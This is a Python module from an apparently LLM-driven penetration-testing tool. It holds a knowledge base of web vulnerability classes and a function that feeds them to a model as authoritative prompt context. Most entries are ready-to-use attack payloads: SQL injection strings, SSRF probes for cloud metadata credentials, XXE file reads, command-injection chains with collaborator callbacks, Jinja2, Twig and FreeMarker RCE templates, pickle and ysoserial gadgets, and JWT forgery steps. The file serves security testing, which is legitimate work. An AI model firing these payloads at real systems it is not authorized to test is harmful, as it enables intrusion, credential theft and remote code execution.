"""
core/knowledge.py — Dynamic Vulnerability Knowledge Base for AuraPT.

Each entry is keyed by a short vulnerability ID and contains:
  - name:               Human-readable vulnerability name.
  - tags:               Set of string tags used by the router for matching.
  - description:        Concise definition (2-3 sentences max).
  - detection_strategy: How to spot it in HTTP traffic (heuristic + tool hints).
  - payloads:           List of copy-paste-ready test payloads.
  - references:         PortSwigger / OWASP links (for operator use — not sent to LLM).

To add a new vulnerability, paste a new block following the same schema.
The router in analyzer.py will pick it up automatically if you add matching
tags to SIGNAL_MAP in that file.
"""

from __future__ import annotations

from typing import TypedDict


class VulnEntry(TypedDict):
    name: str
    tags: set[str]
    description: str
    detection_strategy: str
    payloads: list[str]
    references: list[str]


VULN_KNOWLEDGE_BASE: dict[str, VulnEntry] = {

    # ------------------------------------------------------------------
    # SQL Injection
    # ------------------------------------------------------------------
    "sqli": {
        "name": "SQL Injection (SQLi)",
        "tags": {"sqli", "injection", "database"},
        "description": (
            "Untrusted data is sent to an interpreter as part of a SQL command, "
            "allowing attackers to read, modify, or delete arbitrary database content "
            "and sometimes execute OS commands."
        ),
        "detection_strategy": (
            "Look for numeric IDs, search terms, login fields, or any parameter "
            "reflected in an SQL-backed response. Inject a single quote (') and "
            "observe whether the application errors, delays, or behaves differently. "
            "Blind SQLi can be confirmed with boolean conditions "
            "(`AND 1=1` vs `AND 1=2`) or time-based payloads (`SLEEP`, `WAITFOR`). "
            "Check both GET params and POST body (including JSON fields). "
            "ORDER BY clauses and LIMIT params are often overlooked entry points."
        ),
        "payloads": [
            # Error-based
            "'",
            "''",
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "admin'--",
            # Boolean-blind
            "' AND 1=1--",
            "' AND 1=2--",
            # Time-based (MySQL / MSSQL / PostgreSQL)
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND pg_sleep(5)--",
            # UNION-based (adjust column count)
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            # Out-of-band (DNS)
            "' AND LOAD_FILE('\\\\attacker.burpcollaborator.net\\x')--",
        ],
        "references": [
            "https://portswigger.net/web-security/sql-injection",
            "https://owasp.org/www-community/attacks/SQL_Injection",
        ],
    },

    # ------------------------------------------------------------------
    # Server-Side Request Forgery (SSRF)
    # ------------------------------------------------------------------
    "ssrf": {
        "name": "Server-Side Request Forgery (SSRF)",
        "tags": {"ssrf", "url", "redirect", "fetch", "webhook", "callback"},
        "description": (
            "The server is tricked into making HTTP requests to an attacker-controlled "
            "destination, enabling internal network scanning, metadata service access "
            "(AWS/GCP/Azure IMDS), and in severe cases RCE via internal service exploitation."
        ),
        "detection_strategy": (
            "Identify any parameter that accepts a URL, hostname, IP, or file path: "
            "url=, dest=, redirect=, uri=, path=, feed=, src=, href=, image=, load=, "
            "webhook=, callback=, next=, continue=. "
            "Also look for image proxy endpoints and PDF/screenshot generators. "
            "Test by injecting a Burp Collaborator / interactsh URL and monitor for "
            "DNS/HTTP callbacks. Then escalate to internal targets: "
            "169.254.169.254 (AWS IMDS), 127.0.0.1, internal hostnames."
        ),
        "payloads": [
            # Basic SSRF probes
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://127.0.0.1/",
            "http://localhost/",
            "http://[::1]/",
            # Filter bypass variants
            "http://127.0.0.1.nip.io/",
            "http://0177.0.0.1/",          # octal IP
            "http://0x7f000001/",           # hex IP
            "http://2130706433/",           # decimal IP
            "http://127.1/",
            # Protocol smuggling
            "dict://127.0.0.1:11211/stat",  # memcached
            "gopher://127.0.0.1:6379/_FLUSHALL", # redis
            # Out-of-band confirmation
            "http://YOUR-COLLABORATOR.burpcollaborator.net/",
        ],
        "references": [
            "https://portswigger.net/web-security/ssrf",
            "https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/",
        ],
    },

    # ------------------------------------------------------------------
    # XML External Entity (XXE)
    # ------------------------------------------------------------------
    "xxe": {
        "name": "XML External Entity Injection (XXE)",
        "tags": {"xxe", "xml", "soap", "dtd", "entity"},
        "description": (
            "When an XML parser processes external entity references, attackers can "
            "read arbitrary files from the server filesystem, perform SSRF, or in some "
            "parsers achieve denial-of-service via 'Billion Laughs' expansion."
        ),
        "detection_strategy": (
            "Look for any endpoint accepting XML: Content-Type: application/xml, "
            "text/xml, application/soap+xml. Also check JSON endpoints — some parsers "
            "accept both. Submit a DOCTYPE declaration and an entity reference; if the "
            "entity value appears in the response you have reflected XXE. "
            "If there is no reflection, use OOB XXE with a DNS callback. "
            "SVG uploads, Excel/DOCX imports, and RSS/Atom feed parsers are high-value targets."
        ),
        "payloads": [
            # Classic file read
            """<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>""",
            # Windows file read
            """<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root>&xxe;</root>""",
            # OOB XXE via DTD
            """<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY % ext SYSTEM "http://YOUR-COLLABORATOR/evil.dtd"> %ext;]>
<root/>""",
            # SSRF via XXE
            """<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>""",
            # Billion Laughs (DoS — LAB only)
            """<?xml version="1.0"?>
<!DOCTYPE lolz [<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]>
<root>&lol3;</root>""",
        ],
        "references": [
            "https://portswigger.net/web-security/xxe",
            "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
        ],
    },

    # ------------------------------------------------------------------
    # Command Injection
    # ------------------------------------------------------------------
    "cmdi": {
        "name": "OS Command Injection",
        "tags": {"cmdi", "command", "exec", "shell", "ping", "nslookup", "process"},
        "description": (
            "User-controlled data is passed unsanitised to a system shell, allowing "
            "arbitrary command execution on the host OS. Severity is always CRITICAL."
        ),
        "detection_strategy": (
            "Target parameters that suggest server-side OS interaction: host=, ip=, "
            "domain=, cmd=, exec=, command=, query=, ping=, nslookup=, filename=, "
            "report=, convert=. File conversion endpoints (PDF, image resize), "
            "network utilities (ping, traceroute), and backup features are prime targets. "
            "Use time delays (sleep) for blind detection. Use OOB callbacks to confirm "
            "execution without relying on response reflection."
        ),
        "payloads": [
            # Chaining operators (Linux)
            "; id",
            "& id",
            "| id",
            "&& id",
            "|| id",
            "`id`",
            "$(id)",
            # Blind time-based
            "; sleep 5",
            "& timeout /T 5",   # Windows
            "| ping -c 5 127.0.0.1",
            # OOB confirmation
            "; curl http://YOUR-COLLABORATOR/$(whoami)",
            "; nslookup YOUR-COLLABORATOR",
            "& nslookup YOUR-COLLABORATOR",
            # Filter bypass (whitespace)
            ";{IFS}id",
            ";$IFS$9id",
            # Newline injection
            "%0aid",
            "%0a%0did",
        ],
        "references": [
            "https://portswigger.net/web-security/os-command-injection",
            "https://owasp.org/www-community/attacks/Command_Injection",
        ],
    },

    # ------------------------------------------------------------------
    # JWT Vulnerabilities
    # ------------------------------------------------------------------
    "jwt": {
        "name": "JWT Vulnerabilities",
        "tags": {"jwt", "token", "bearer", "authorization", "authentication", "alg", "hs256", "rs256"},
        "description": (
            "JSON Web Tokens are often misconfigured: accepting 'alg:none', "
            "vulnerable to algorithm confusion (RS256→HS256), signed with weak secrets, "
            "or missing critical claims (exp, aud, iss), allowing attackers to forge "
            "arbitrary identities including admin accounts."
        ),
        "detection_strategy": (
            "Look for Authorization: Bearer <token> headers or cookie values "
            "that decode as three base64url segments (header.payload.signature). "
            "Decode the header to find the `alg` field. "
            "If alg=RS256 check for algorithm confusion; if alg=HS256 try weak secret "
            "brute-force (hashcat mode 16500). Check if `exp` is enforced by replaying "
            "an expired token. Check if `alg: none` is accepted. "
            "Look for JWTs passed in query strings (appear in server logs)."
        ),
        "payloads": [
            # alg:none — remove signature, set alg to none
            "Modify header to: {\"alg\": \"none\", \"typ\": \"JWT\"} then strip signature",
            "Modify header to: {\"alg\": \"None\"}  (capitalisation bypass)",
            "Modify header to: {\"alg\": \"NONE\"}",
            "Modify header to: {\"alg\": \"nOnE\"}",
            # Algorithm confusion RS256→HS256
            "Change alg from RS256 to HS256; re-sign with the server's RSA public key as the HMAC secret",
            # Weak secret brute-force command
            "hashcat -a 0 -m 16500 <JWT> /usr/share/wordlists/rockyou.txt",
            "john --format=HMAC-SHA256 --wordlist=rockyou.txt jwt.txt",
            # kid header injection (SQLi / path traversal)
            "{\"kid\": \"../../dev/null\"}  → sign with empty string as secret",
            "{\"kid\": \"' UNION SELECT 'attacker_secret'--\"}",
            # jwk header injection
            "Embed attacker-controlled JWK in the JWT header's `jwk` parameter",
            # jku header injection
            "Set `jku` header to attacker-hosted JWKS endpoint URL",
            # Claim manipulation
            "Set `exp` to 9999999999 (far future) and check if server rejects it",
            "Remove `exp` claim entirely",
            "Escalate `role`/`is_admin`/`scope` claims in payload",
        ],
        "references": [
            "https://portswigger.net/web-security/jwt",
            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens",
        ],
    },

    # ------------------------------------------------------------------
    # BOLA / IDOR
    # ------------------------------------------------------------------
    "idor": {
        "name": "Broken Object Level Authorization (BOLA / IDOR)",
        "tags": {"idor", "bola", "id", "uuid", "object", "reference", "access_control"},
        "description": (
            "The API exposes object identifiers (numeric IDs, UUIDs, slugs) in requests "
            "without verifying that the authenticated user has permission to access that "
            "specific object, enabling horizontal and vertical privilege escalation."
        ),
        "detection_strategy": (
            "Identify every endpoint where an object identifier appears in the URL path, "
            "query string, or request body: /api/users/{id}, /orders/{order_id}, "
            "?account=12345, {\"invoice_id\": 999}. "
            "Create two accounts (A and B). Capture a request from account A that "
            "references A's object ID. Replay it authenticated as account B — if you "
            "get A's data, BOLA is confirmed. Also test with no authentication token "
            "(missing function-level authorization). Try integer enumeration on numeric "
            "IDs and UUIDv1 prediction for time-based UUIDs."
        ),
        "payloads": [
            # Horizontal escalation — swap your ID for another user's
            "GET /api/users/1337 → change 1337 to 1, 2, 3...",
            "GET /api/orders/YOUR-ORDER-ID → replace with another user's order ID",
            # Vertical escalation — access admin objects
            "GET /api/admin/users/1",
            "GET /api/reports/global",
            # UUID enumeration helpers
            "python3 -c \"import uuid; print(uuid.UUID(int=uuid.uuid1().int - 1))\"",
            # Parameter pollution
            "GET /api/profile?user_id=victim_id&user_id=attacker_id",
            # JSON body swap
            "{\"user_id\": <victim_id>}  in PUT /api/profile",
            # HTTP method override (if PATCH is restricted but PUT isn't)
            "X-HTTP-Method-Override: DELETE",
        ],
        "references": [
            "https://portswigger.net/web-security/access-control/idor",
            "https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/",
        ],
    },

    # ------------------------------------------------------------------
    # Mass Assignment
    # ------------------------------------------------------------------
    "mass_assignment": {
        "name": "Mass Assignment / Parameter Pollution",
        "tags": {"mass_assignment", "parameter", "body", "json", "role", "admin", "privilege"},
        "description": (
            "Frameworks that automatically bind request parameters to model attributes "
            "allow attackers to inject fields the developer never intended to be "
            "user-controllable (e.g., is_admin, role, account_balance, verified)."
        ),
        "detection_strategy": (
            "Target every POST/PUT/PATCH endpoint that accepts a JSON or form body. "
            "First enumerate the model's fields via a GET response for the same object. "
            "Then replay the write request adding extra fields: is_admin, role, "
            "verified, balance, credit, status, account_type, permissions. "
            "Also check for nested objects: {\"user\": {\"role\": \"admin\"}}. "
            "Try adding fields with different casings and underscore/camelCase variants."
        ),
        "payloads": [
            # Common privilege escalation fields
            "{\"is_admin\": true}",
            "{\"role\": \"admin\"}",
            "{\"role\": \"superuser\"}",
            "{\"verified\": true}",
            "{\"email_verified\": true}",
            "{\"account_type\": \"premium\"}",
            "{\"status\": \"active\"}",
            "{\"balance\": 99999}",
            "{\"credit\": 99999}",
            "{\"permissions\": [\"read\", \"write\", \"admin\"]}",
            # Nested variants
            "{\"user\": {\"role\": \"admin\", \"is_admin\": true}}",
            # camelCase variants
            "{\"isAdmin\": true}",
            "{\"accountType\": \"admin\"}",
            # Ruby on Rails / Django common fields
            "{\"admin\": true}",
            "{\"superadmin\": 1}",
        ],
        "references": [
            "https://portswigger.net/web-security/api-testing/mass-assignment",
            "https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/",
        ],
    },

    # ------------------------------------------------------------------
    # Server-Side Template Injection (SSTI)
    # ------------------------------------------------------------------
    "ssti": {
        "name": "Server-Side Template Injection (SSTI)",
        "tags": {"ssti", "template", "render", "jinja", "twig", "freemarker", "smarty"},
        "description": (
            "User input is embedded directly into a server-side template and evaluated "
            "by the template engine, leading to RCE in most frameworks (Jinja2, Twig, "
            "FreeMarker, Smarty, Velocity)."
        ),
        "detection_strategy": (
            "Any parameter whose value appears reflected in the response is a candidate. "
            "Common locations: error messages with user input, personalised greetings, "
            "PDF/email template generators, search results, custom 404 pages. "
            "Inject {{7*7}} — if '49' appears in the response, you have SSTI. "
            "Use a polyglot probe to fingerprint the engine before escalating to RCE."
        ),
        "payloads": [
            # Detection polyglot
            "${{<%[%'\"}}%\\.",
            # Engine fingerprinting
            "{{7*7}}",       # Jinja2, Twig → 49
            "{{7*'7'}}",     # Jinja2 → 7777777 | Twig → 49
            "${7*7}",        # FreeMarker, Smarty
            "#{7*7}",        # Ruby ERB
            "*{7*7}",        # Spring (Java)
            # Jinja2 RCE chain
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "{{''.__class__.mro()[1].__subclasses__()[40]('/etc/passwd').read()}}",
            # Twig RCE
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            # FreeMarker RCE
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        ],
        "references": [
            "https://portswigger.net/web-security/server-side-template-injection",
            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-Side_Template_Injection",
        ],
    },

    # ------------------------------------------------------------------
    # Insecure Deserialization
    # ------------------------------------------------------------------
    "deserial": {
        "name": "Insecure Deserialization",
        "tags": {"deserial", "serialization", "pickle", "java", "ysoserial", "viewstate", "session"},
        "description": (
            "Untrusted data is deserialised without validation, allowing attackers to "
            "manipulate object graphs to achieve RCE, authentication bypass, or "
            "privilege escalation. Critical in Java, PHP, Python (pickle), and .NET."
        ),
        "detection_strategy": (
            "Look for base64-encoded blobs in cookies, hidden form fields, or request "
            "bodies. Java serialised objects start with rO0AB (base64 of 0xACED0005). "
            "PHP serialized strings start with O: or a:. Python pickles start with 0x80. "
            ".NET ViewState is base64 in __VIEWSTATE param. "
            "Look for Content-Type: application/x-java-serialized-object. "
            "Modify the serialised blob and observe if the application errors differently "
            "(type confusion) or executes a callback."
        ),
        "payloads": [
            # Java — use ysoserial
            "java -jar ysoserial.jar CommonsCollections6 'curl YOUR-COLLABORATOR' | base64",
            "java -jar ysoserial.jar CommonsCollections5 'ping YOUR-COLLABORATOR' | base64",
            # Python pickle RCE
            "import pickle, os; pickle.dumps(type('x',(object,),{'__reduce__':lambda s:(os.system,('id',))})())",
            # PHP object injection gadget probe
            "O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"test\";}",
            # .NET ViewState tampering (if MAC disabled)
            "Use ysoserial.net: ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c 'whoami'",
            # Generic: flip a boolean in the blob
            "Base64-decode → flip is_admin / role byte → re-encode → replay",
        ],
        "references": [
            "https://portswigger.net/web-security/deserialization",
            "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/",
        ],
    },

    # ------------------------------------------------------------------
    # GraphQL Injection & Misconfiguration
    # ------------------------------------------------------------------
    "graphql": {
        "name": "GraphQL Injection & Misconfiguration",
        "tags": {"graphql", "query", "mutation", "introspection", "gql"},
        "description": (
            "GraphQL APIs are often deployed with introspection enabled, lack "
            "query depth/complexity limits (DoS), and may expose mutations that bypass "
            "REST-layer authorization. Nested queries can also trigger SQLi or IDOR."
        ),
        "detection_strategy": (
            "Look for endpoints at /graphql, /api/graphql, /gql, /query. "
            "POST with Content-Type: application/json and body {\"query\": \"{ __typename }\"}. "
            "If it returns {\"data\": {\"__typename\": \"Query\"}} the endpoint exists. "
            "Run a full introspection query to map the entire schema. "
            "Check for aliasing to bypass rate-limits, batch queries for credential stuffing, "
            "and field suggestions leaking schema even when introspection is disabled."
        ),
        "payloads": [
            # Introspection — full schema dump
            "{\"query\": \"{__schema{types{name,fields{name,args{name,type{name,kind,ofType{name,kind}}}}}}}\" }",
            # __typename probe (works even when introspection disabled)
            "{\"query\": \"{ __typename }\"}",
            # Field suggestion probe (typo → did you mean)
            "{\"query\": \"{ usr { id } }\"}",
            # Batch query (rate-limit bypass)
            "[{\"query\": \"mutation { login(user: 'admin', pass: 'password1') { token } }\"}, ...]",
            # Alias-based brute force
            "{\"query\": \"{ a: login(user:\\\"admin\\\",pass:\\\"pass1\\\") b: login(user:\\\"admin\\\",pass:\\\"pass2\\\") }\"}",
            # Nested query DoS (depth bomb)
            "{\"query\": \"{ user { friends { friends { friends { friends { id } } } } } }\"}",
            # IDOR via GraphQL
            "{\"query\": \"{ user(id: 1) { email, password_hash, is_admin } }\"}",
        ],
        "references": [
            "https://portswigger.net/web-security/graphql",
            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL",
        ],
    },
}


def get_entry(vuln_id: str) -> VulnEntry | None:
    """Return a single knowledge base entry by ID, or None if not found."""
    return VULN_KNOWLEDGE_BASE.get(vuln_id)


def format_for_prompt(entries: dict[str, VulnEntry]) -> str:
    """Serialise selected knowledge base entries into a compact prompt block.

    The returned string is injected verbatim into the LLM context under a
    clearly labelled section so the model knows to treat it as authoritative
    reference material, not user input.
    """
    if not entries:
        return ""

    lines: list[str] = [
        "## VULNERABILITY REFERENCE KNOWLEDGE",
        "",
        "The following entries are authoritative references selected specifically",
        "for the request/API surface being analysed. You MUST use this knowledge",
        "as your primary source when identifying, describing, and recommending",
        "payloads for the vulnerabilities present in the target below.",
        "Do not rely on generic knowledge if a specific entry contradicts it.",
        "",
    ]

    for vuln_id, entry in entries.items():
        lines += [
            f"### [{vuln_id.upper()}] {entry['name']}",
            "",
            f"**Description:** {entry['description']}",
            "",
            f"**Detection Strategy:** {entry['detection_strategy']}",
            "",
            "**Recommended Payloads:**",
        ]
        for payload in entry["payloads"]:
            # Multi-line payloads (XML blocks etc.) get a fenced block
            if "\n" in payload:
                lines.append(f"```\n{payload}\n```")
            else:
                lines.append(f"- `{payload}`")
        lines.append("")

    return "\n".join(lines)
